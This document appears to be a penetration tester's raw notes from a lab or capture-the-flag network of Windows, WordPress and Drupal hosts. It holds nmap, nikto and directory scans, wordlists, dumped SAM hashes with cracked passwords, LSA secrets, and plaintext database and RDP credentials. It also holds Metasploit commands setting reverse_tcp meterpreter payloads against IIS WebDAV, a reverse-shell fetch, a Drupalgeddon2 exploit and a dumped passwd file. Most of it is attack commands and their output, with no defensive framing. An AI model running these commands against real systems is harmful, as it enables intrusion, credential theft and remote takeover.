## 1
```r
Nmap scan report for ip-192-168-100-52.eu-central-1.compute.internal (192.168.100.52)
Host is up (0.00033s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:15:59:A5:8F:D5 (Unknown)
Service Info: Host: IP-192-168-100-52


Syntex
admin
dbadmin
mike
steven
auditor
Vincenzo
Administrator
lawrence
student
mary
vince

bonita
diamond
qwertyuiop
sayang
789456
syntex0421
computadora
blanca
vincenzzo
lw9875
superman
greenday
swordfish
ROOT#123
estrella
```

## 192.168.100.50 Wordpress
Wordpress 5.9.3

```
Administrator flag:d8afa3e5746e4a37ac96cd7f077c03ec

db_name:wordpress
db_user:root
db_password:""
db_host:localhost:3307
```

```
[*] Target system bootKey: 0x37cbff09ae8a6e2a3db546e135ca4650
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mike:1009:aad3b435b51404eeaad3b435b51404ee:c7bad7d1cc2f3c69adea5ccb429234ad::: diamond
vince:1010:aad3b435b51404eeaad3b435b51404ee:c9b30a86acaea990bf9fa6c35ac9dd92:::greenday
admin:1011:aad3b435b51404eeaad3b435b51404ee:72f5cfa80f07819ccbcfb72feb9eb9b7::: superman
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x21cb359705f458dc0ef72139f2639f80cb97031e
dpapi_userkey:0x0f0a319789763d146d108ca3f97451036d55df88
[*] NL$KM 
 0000   FC 40 EA 8C BF 3B EC 3C  45 40 0F 24 43 3B 34 27   .@...;.<E@.$C;4'
 0010   14 74 BF BA 2A CF 11 C9  D0 EB D3 1D A1 BA E6 0F   .t..*...........
 0020   6D 82 5E 8C 1C C1 04 C9  AC 4A 44 E9 1C BE 44 42   m.^......JD...DB
 0030   9D 7E C8 0B 78 63 12 45  DC 1F 49 D9 5E 0C CA 00   .~..xc.E..I.^...
NL$KM:fc40ea8cbf3bec3c45400f24433b34271474bfba2acf11c9d0ebd31da1bae60f6d825e8c1cc104c9ac4a44e91cbe44429d7ec80b78631245dc1f49d95e0cca00

```

```
responsive thumbnail slider is 
mike:diamond
```

```
WINRM 5985
xfreerdp /u:admin /p:superman /v:192.168.100.50
admin:superman
```

```
phpmyadmin user root, no password, mariadb

wordpress wp_users
User: admin
Hash: $P$B.1p.5fiYdFnwttTzSkvT2sl01rlOj0 : estrella
```

```r
nmap -p- -sV -sC 192.168.100.50-54
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-08 14:52 IST
Nmap scan report for ip-192-168-100-50.eu-central-1.compute.internal (192.168.100.50)
Host is up (0.00058s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: WAMPSERVER Homepage
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds
3307/tcp  open  opsession-prxy?
| fingerprint-strings: 
|   NULL: 
|_    Host 'ip-192-168-100-5.eu-central-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2023-12-08T09:24:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINSERVER-01
| Not valid before: 2023-12-07T09:14:28
|_Not valid after:  2024-06-07T09:14:28
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-01
|   NetBIOS_Domain_Name: WINSERVER-01
|   NetBIOS_Computer_Name: WINSERVER-01
|   DNS_Domain_Name: WINSERVER-01
|   DNS_Computer_Name: WINSERVER-01
|   Product_Version: 6.3.9600
|_  System_Time: 2023-12-08T09:24:17+00:00
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49180/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3307-TCP:V=7.92%I=7%D=12/8%Time=6572E081%P=x86_64-pc-linux-gnu%r(NU
SF:LL,6D,"i\0\0\x01\xffj\x04Host\x20'ip-192-168-100-5\.eu-central-1\.compu
SF:te\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x2
SF:0MariaDB\x20server");
MAC Address: 02:9D:EF:84:99:21 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WINSERVER-01, NetBIOS user: <unknown>, NetBIOS MAC: 02:9d:ef:84:99:21 (unknown)
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb2-time: 
|   date: 2023-12-08T09:24:19
|_  start_date: 2023-12-08T09:14:12
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: WINSERVER-01
|   NetBIOS computer name: WINSERVER-01\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-12-08T09:24:19+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required

```

```r
http://192.168.100.50/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000

MySQL Version:
    5.7.36 - Port defined for MySQL: 3306
MariaDB Version:
    10.6.5 - Port defined for MariaDB: 3307
    Server Software:

Apache/2.4.51 (Win64) PHP/7.4.26 - Port defined for Apache: 80
PHP Version:
    7.4.26

Wordpress 5.3.9
phpmyadmin 5.1.1

http://192.168.100.50/?phpinfo=-1
C:/wamp64/www/index.php 
```

```r
+ Server: Apache/2.4.51 (Win64) PHP/7.4.26
+ Retrieved x-powered-by header: PHP/7.4.26
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'link' found, with contents: <http://wordpress.local/wp-json/>; rel="https://api.w.org/"
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /home/: This might be interesting...
+ OSVDB-3092: /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3233: /index.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-5292: /?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ OSVDB-5292: /?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ OSVDB-5292: /?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ OSVDB-5292: /?show=http://cirt.net/rfiinc.txt??: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ /wp-app.log: Wordpress' wp-app.log may leak application/system details.
+ /wordpresswp-app.log: Wordpress' wp-app.log may leak application/system details.
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 8742 requests: 0 error(s) and 23 item(s) reported on remote host
+ End Time:           2023-12-08 15:17:45 (GMT5.5) (887 seconds)
---------------------------------------------------------------------------

```


```r
---- Scanning URL: http://192.168.100.50/ ----
+ http://192.168.100.50/0 (CODE:200|SIZE:47637)                                                                                                     
+ http://192.168.100.50/admin (CODE:302|SIZE:0)                                                                                                     
+ http://192.168.100.50/atom (CODE:301|SIZE:0)                                                                                                      
+ http://192.168.100.50/aux (CODE:403|SIZE:289)                                                                                                     
+ http://192.168.100.50/cgi-bin/ (CODE:403|SIZE:289)                                                                                                
+ http://192.168.100.50/com1 (CODE:403|SIZE:289)                                                                                                    
+ http://192.168.100.50/com2 (CODE:403|SIZE:289)                                                                                                    
+ http://192.168.100.50/com3 (CODE:403|SIZE:289)                                                                                                    
+ http://192.168.100.50/comment-page-1 (CODE:301|SIZE:0)                                                                                            
+ http://192.168.100.50/con (CODE:403|SIZE:289)                                                                                                     
+ http://192.168.100.50/dashboard (CODE:302|SIZE:0)                                                                                                 
+ http://192.168.100.50/embed (CODE:200|SIZE:18451)                                                                                                 
+ http://192.168.100.50/favicon.ico (CODE:200|SIZE:202575)                                                                                          
==> DIRECTORY: http://192.168.100.50/feed/                                                                                                          
+ http://192.168.100.50/home (CODE:200|SIZE:47637)                                                                                                  
+ http://192.168.100.50/Home (CODE:200|SIZE:47637)                                                                                                  
+ http://192.168.100.50/index (CODE:200|SIZE:6369)                                                                                                  
+ http://192.168.100.50/Index (CODE:200|SIZE:6369)                                                                                                  
+ http://192.168.100.50/index.php (CODE:200|SIZE:6369)                                                                                              
+ http://192.168.100.50/login (CODE:302|SIZE:0)                                                                                                     
==> DIRECTORY: http://192.168.100.50/logo/                                                                                                          
+ http://192.168.100.50/lpt1 (CODE:403|SIZE:289)                                                                                                    
+ http://192.168.100.50/lpt2 (CODE:403|SIZE:289)                                                                                                    
+ http://192.168.100.50/nul (CODE:403|SIZE:289)                                                                                                     
+ http://192.168.100.50/page1 (CODE:200|SIZE:47637)                                                                                                 
+ http://192.168.100.50/page2 (CODE:200|SIZE:47641)                                                                                                 
==> DIRECTORY: http://192.168.100.50/phpmyadmin/                                                                                                    
+ http://192.168.100.50/prn (CODE:403|SIZE:289)                                                                                                     
+ http://192.168.100.50/rdf (CODE:301|SIZE:0)                                                                                                       
+ http://192.168.100.50/rss (CODE:301|SIZE:0)                                                                                                       
+ http://192.168.100.50/rss2 (CODE:301|SIZE:0)                                                                                                      
+ http://192.168.100.50/sitemap.xml (CODE:302|SIZE:0)                                                                                               
==> DIRECTORY: http://192.168.100.50/wordpress/                                                                                                     
==> DIRECTORY: http://192.168.100.50/wp-admin/                                                                                                      
                                                                                                                                                    
---- Entering directory: http://192.168.100.50/feed/ ----
==> DIRECTORY: http://192.168.100.50/feed/atom/                                                                                                     
+ http://192.168.100.50/feed/feed (CODE:301|SIZE:0)                                                                                                 
+ http://192.168.100.50/feed/index.php (CODE:301|SIZE:0)                                                                                            
==> DIRECTORY: http://192.168.100.50/feed/rdf/                                                                                                      
+ http://192.168.100.50/feed/rss (CODE:301|SIZE:0)                                                                                                  
+ http://192.168.100.50/feed/rss2 (CODE:301|SIZE:0)                                                                                                 
+ http://192.168.100.50/feed/sitemap.xml (CODE:302|SIZE:0)                                                                                          
                                                                                                                                                    
---- Entering directory: http://192.168.100.50/logo/ ----
==> DIRECTORY: http://192.168.100.50/logo/0/                                                                                                        
+ http://192.168.100.50/logo/atom (CODE:301|SIZE:0)                                                                                                 
+ http://192.168.100.50/logo/comment-page-1 (CODE:301|SIZE:0)                                                                                       
==> DIRECTORY: http://192.168.100.50/logo/embed/                                                                                                    
+ http://192.168.100.50/logo/feed (CODE:301|SIZE:0)                                                                                                 
+ http://192.168.100.50/logo/index.php (CODE:301|SIZE:0)                                                                                            
+ http://192.168.100.50/logo/page1 (CODE:301|SIZE:0)                                                                                                
+ http://192.168.100.50/logo/page2 (CODE:301|SIZE:0)                                                                                                
+ http://192.168.100.50/logo/rdf (CODE:301|SIZE:0)                                                                                                  
+ http://192.168.100.50/logo/rss (CODE:301|SIZE:0)                                                                                                  
+ http://192.168.100.50/logo/rss2 (CODE:301|SIZE:0)                                                                                                 
+ http://192.168.100.50/logo/sitemap.xml (CODE:302|SIZE:0)                                                                                          
+ http://192.168.100.50/logo/trackback (CODE:302|SIZE:0)                                                                                            
                                                                                                                                                    
---- Entering directory: http://192.168.100.50/phpmyadmin/ ----
+ http://192.168.100.50/phpmyadmin/atom (CODE:301|SIZE:0)                                                                                           
+ http://192.168.100.50/phpmyadmin/aux (CODE:403|SIZE:289)                                                                                          
+ http://192.168.100.50/phpmyadmin/changelog (CODE:200|SIZE:49416)                                                                                  
+ http://192.168.100.50/phpmyadmin/ChangeLog (CODE:200|SIZE:49416)                                                                                  
+ http://192.168.100.50/phpmyadmin/com1 (CODE:403|SIZE:289)                                                                                         
+ http://192.168.100.50/phpmyadmin/com2 (CODE:403|SIZE:289)                                                                                         
+ http://192.168.100.50/phpmyadmin/com3 (CODE:403|SIZE:289)                                                                                         
+ http://192.168.100.50/phpmyadmin/composer (CODE:200|SIZE:4064)                                                                                    
+ http://192.168.100.50/phpmyadmin/con (CODE:403|SIZE:289)                                                                                          
==> DIRECTORY: http://192.168.100.50/phpmyadmin/doc/                                                                                                
==> DIRECTORY: http://192.168.100.50/phpmyadmin/examples/                                                                                           
+ http://192.168.100.50/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                                                                
==> DIRECTORY: http://192.168.100.50/phpmyadmin/feed/                                                                                               
+ http://192.168.100.50/phpmyadmin/index (CODE:200|SIZE:19810)                                                                                      
+ http://192.168.100.50/phpmyadmin/Index (CODE:200|SIZE:19810)                                                                                      
+ http://192.168.100.50/phpmyadmin/index.php (CODE:200|SIZE:19810)                                                                                  
==> DIRECTORY: http://192.168.100.50/phpmyadmin/js/                                                                                                 
==> DIRECTORY: http://192.168.100.50/phpmyadmin/libraries/                                                                                          
+ http://192.168.100.50/phpmyadmin/license (CODE:200|SIZE:18092)                                                                                    
+ http://192.168.100.50/phpmyadmin/LICENSE (CODE:200|SIZE:18092)                                                                                    
==> DIRECTORY: http://192.168.100.50/phpmyadmin/locale/                                                                                             
+ http://192.168.100.50/phpmyadmin/lpt1 (CODE:403|SIZE:289)                                                                                         
+ http://192.168.100.50/phpmyadmin/lpt2 (CODE:403|SIZE:289)                                                                                         
+ http://192.168.100.50/phpmyadmin/nul (CODE:403|SIZE:289)                                                                                          
+ http://192.168.100.50/phpmyadmin/package (CODE:200|SIZE:2252)                                                                                     
+ http://192.168.100.50/phpmyadmin/print (CODE:200|SIZE:1034)                                                                                       
+ http://192.168.100.50/phpmyadmin/prn (CODE:403|SIZE:289)                                                                                          
+ http://192.168.100.50/phpmyadmin/rdf (CODE:301|SIZE:0)                                                                                            
+ http://192.168.100.50/phpmyadmin/readme (CODE:200|SIZE:1520)                                                                                      
+ http://192.168.100.50/phpmyadmin/Readme (CODE:200|SIZE:1520)                                                                                      
+ http://192.168.100.50/phpmyadmin/README (CODE:200|SIZE:1520)                                                                                      
+ http://192.168.100.50/phpmyadmin/robots (CODE:200|SIZE:26)                                                                                        
+ http://192.168.100.50/phpmyadmin/robots.txt (CODE:200|SIZE:26)                                                                                    
+ http://192.168.100.50/phpmyadmin/rss (CODE:301|SIZE:0)                                                                                            
+ http://192.168.100.50/phpmyadmin/rss2 (CODE:301|SIZE:0)                                                                                           
==> DIRECTORY: http://192.168.100.50/phpmyadmin/setup/                                                                                              
+ http://192.168.100.50/phpmyadmin/sitemap.xml (CODE:302|SIZE:0)                                                                                    
==> DIRECTORY: http://192.168.100.50/phpmyadmin/sql/                                                                                                
==> DIRECTORY: http://192.168.100.50/phpmyadmin/SQL/                                                                                                
==> DIRECTORY: http://192.168.100.50/phpmyadmin/templates/                                                                                          
==> DIRECTORY: http://192.168.100.50/phpmyadmin/themes/                                                                                             
==> DIRECTORY: http://192.168.100.50/phpmyadmin/Themes/                                                                                             
==> DIRECTORY: http://192.168.100.50/phpmyadmin/tmp/                                                                                                
==> DIRECTORY: http://192.168.100.50/phpmyadmin/TMP/                                                                                                
+ http://192.168.100.50/phpmyadmin/url (CODE:302|SIZE:0)                                                                                            
==> DIRECTORY: http://192.168.100.50/phpmyadmin/vendor/                                                                                             
                                                                                                                                                    
---- Entering directory: http://192.168.100.50/wordpress/ ----
+ http://192.168.100.50/wordpress/atom (CODE:301|SIZE:0)                                                                                            
+ http://192.168.100.50/wordpress/aux (CODE:403|SIZE:289)                                                                                           
+ http://192.168.100.50/wordpress/com1 (CODE:403|SIZE:289)                                                                                          
+ http://192.168.100.50/wordpress/com2 (CODE:403|SIZE:289)                                                                                          
+ http://192.168.100.50/wordpress/com3 (CODE:403|SIZE:289)                                                                                          
+ http://192.168.100.50/wordpress/con (CODE:403|SIZE:289)                                                                                           
==> DIRECTORY: http://192.168.100.50/wordpress/feed/                                                                                                
+ http://192.168.100.50/wordpress/index.php (CODE:301|SIZE:0)                                                                                       
+ http://192.168.100.50/wordpress/license (CODE:200|SIZE:19915)                                                                                     
+ http://192.168.100.50/wordpress/LICENSE (CODE:200|SIZE:19915)                                                                                     
+ http://192.168.100.50/wordpress/lpt1 (CODE:403|SIZE:289)                                                                                          
+ http://192.168.100.50/wordpress/lpt2 (CODE:403|SIZE:289)                                                                                          
+ http://192.168.100.50/wordpress/nul (CODE:403|SIZE:289)                                                                                           
+ http://192.168.100.50/wordpress/prn (CODE:403|SIZE:289)                                                                                           
+ http://192.168.100.50/wordpress/rdf (CODE:301|SIZE:0)                                                                                             
+ http://192.168.100.50/wordpress/readme (CODE:200|SIZE:7437)                                                                                       
+ http://192.168.100.50/wordpress/Readme (CODE:200|SIZE:7437)                                                                                       
+ http://192.168.100.50/wordpress/README (CODE:200|SIZE:7437)                                                                                       
+ http://192.168.100.50/wordpress/rss (CODE:301|SIZE:0)                                                                                             
+ http://192.168.100.50/wordpress/rss2 (CODE:301|SIZE:0)                                                                                            
+ http://192.168.100.50/wordpress/sitemap.xml (CODE:302|SIZE:0)                                                                                     
==> DIRECTORY: http://192.168.100.50/wordpress/wp-admin/                                                                                            
+ http://192.168.100.50/wordpress/wp-config (CODE:200|SIZE:0)                                                                                       
==> DIRECTORY: http://192.168.100.50/wordpress/wp-content/                                                                                          
+ http://192.168.100.50/wordpress/wp-cron (CODE:200|SIZE:0)                                                                                         
==> DIRECTORY: http://192.168.100.50/wordpress/wp-includes/                                                                                         
+ http://192.168.100.50/wordpress/wp-links-opml (CODE:200|SIZE:221)                                                                                 
+ http://192.168.100.50/wordpress/wp-load (CODE:200|SIZE:0)                                                                                         
+ http://192.168.100.50/wordpress/wp-login (CODE:200|SIZE:6836)                                                                                     
+ http://192.168.100.50/wordpress/wp-mail (CODE:403|SIZE:2616)                                                                                      
+ http://192.168.100.50/wordpress/wp-settings (CODE:200|SIZE:3158)                                                                                  
+ http://192.168.100.50/wordpress/wp-signup (CODE:302|SIZE:0)                                                                                       
+ http://192.168.100.50/wordpress/xmlrpc (CODE:405|SIZE:42)                                                                                         
+ http://192.168.100.50/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                                     
                                                                                                                                                    
---- Entering directory: http://192.168.100.50/wp-admin/ ----
+ http://192.168.100.50/wp-admin/atom (CODE:301|SIZE:0)                                                                                             
==> DIRECTORY: http://192.168.100.50/wp-admin/feed/                                                                                                 
+ http://192.168.100.50/wp-admin/index.php (CODE:301|SIZE:0)                                                                                        
+ http://192.168.100.50/wp-admin/rdf (CODE:301|SIZE:0)                                                                                              
+ http://192.168.100.50/wp-admin/rss (CODE:301|SIZE:0)                                                                                              
+ http://192.168.100.50/wp-admin/rss2 (CODE:301|SIZE:0)                                                                                             
+ http://192.168.100.50/wp-admin/sitemap.xml (CODE:302|SIZE:0)                                                                                      
                                                                                                                                                    
---- Entering directory: http://192.168.100.50/feed/atom/ ----
+ http://192.168.100.50/feed/atom/atom (CODE:301|SIZE:0)                                                                                            
+ http://192.168.100.50/feed/atom/feed (CODE:301|SIZE:0)                                                                                            
+ http://192.168.100.50/feed/atom/index.php (CODE:301|SIZE:0)                                                                                       
+ http://192.168.100.50/feed/atom/rdf (CODE:301|SIZE:0)                                                                                             
+ http://192.168.100.50/feed/atom/rss (CODE:301|SIZE:0)                                                                                             
+ http://192.168.100.50/feed/atom/rss2 (CODE:301|SIZE:0)                                                                                            
+ http://192.168.100.50/feed/atom/sitemap.xml (CODE:302|SIZE:0) 
```


## 192.168.100.51

```
curl 192.168.100.51/rev.asp
set payload windows/x64/meterpreter/reverse_tcp
```

```
Administrator:67e21e24174d4f92b8461a9edd497c00

```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
steven:1009:aad3b435b51404eeaad3b435b51404ee:8ae09f001f2b3cc4f4ff6346fc9545c4:::bonita
```

```
## METASPLOIT
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler
use exploit/windows/iis/iis_webdav_upload_asp

set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>

set HttpUsername <USER>
set HttpPassword <PW>
set PATH /webdav/metasploit.asp
```

```r

----------------------------------------------------------------------------------
Nmap scan report for ip-192-168-100-51.eu-central-1.compute.internal (192.168.100.51)
Host is up (0.00029s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-19-22  02:25AM       <DIR>          aspnet_client
| 04-19-22  01:19AM                 1400 cmdasp.aspx
| 04-19-22  12:17AM                99710 iis-85.png
| 04-19-22  12:17AM                  701 iisstart.htm
|_04-19-22  02:13AM                   22 robots.txt.txt
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
|_http-svn-info: ERROR: Script execution failed (use -d to debug)
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Date: Fri, 08 Dec 2023 09:24:17 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/8.5
|   Directory Listing: 
|     http://ip-192-168-100-51.eu-central-1.compute.internal/
|     http://ip-192-168-100-51.eu-central-1.compute.internal/aspnet_client/
|     http://ip-192-168-100-51.eu-central-1.compute.internal/cmdasp.aspx
|     http://ip-192-168-100-51.eu-central-1.compute.internal/iis-85.png
|     http://ip-192-168-100-51.eu-central-1.compute.internal/iisstart.htm
|_    http://ip-192-168-100-51.eu-central-1.compute.internal/robots.txt.txt
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-02
|   NetBIOS_Domain_Name: WINSERVER-02
|   NetBIOS_Computer_Name: WINSERVER-02
|   DNS_Domain_Name: WINSERVER-02
|   DNS_Computer_Name: WINSERVER-02
|   Product_Version: 6.3.9600
|_  System_Time: 2023-12-08T09:24:19+00:00
|_ssl-date: 2023-12-08T09:24:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINSERVER-02
| Not valid before: 2023-12-07T09:14:07
|_Not valid after:  2024-06-07T09:14:07
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49174/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:D8:C4:55:D4:0D (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-12-08T09:24:19
|_  start_date: 2023-12-08T09:13:52
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: WINSERVER-02, NetBIOS user: <unknown>, NetBIOS MAC: 02:d8:c4:55:d4:0d (unknown)

```

```r
+ Server: Microsoft-IIS/8.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dav header: 1,2,3
+ Retrieved ms-author-via header: DAV
+ Uncommon header 'ms-author-via' found, with contents: DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK 
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (LOCK PROPPATCH COPY PROPFIND UNLOCK MKCOL listed as allowed)
+ 7915 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2023-12-08 15:26:04 (GMT5.5) (17 seconds)
---------------------------------------------------------------------------
```

```r
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00252-70000-00000-AA535
Original Install Date:     12/31/2021, 8:01:42 AM
System Boot Time:          12/8/2023, 9:12:32 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     16,384 MB
Available Physical Memory: 15,488 MB
Virtual Memory: Max Size:  24,576 MB
Virtual Memory: Available: 23,743 MB
Virtual Memory: In Use:    833 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
```


## 192.168.100.52 Drupal

```
auditor flag: f0b93ab038bb467aa305433c638cad7f
root flag: 4c4d3851efa54d3bbb6cf400d33fbcd2
```

```
exploit(unix/webapp/drupal_drupalgeddon2)
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
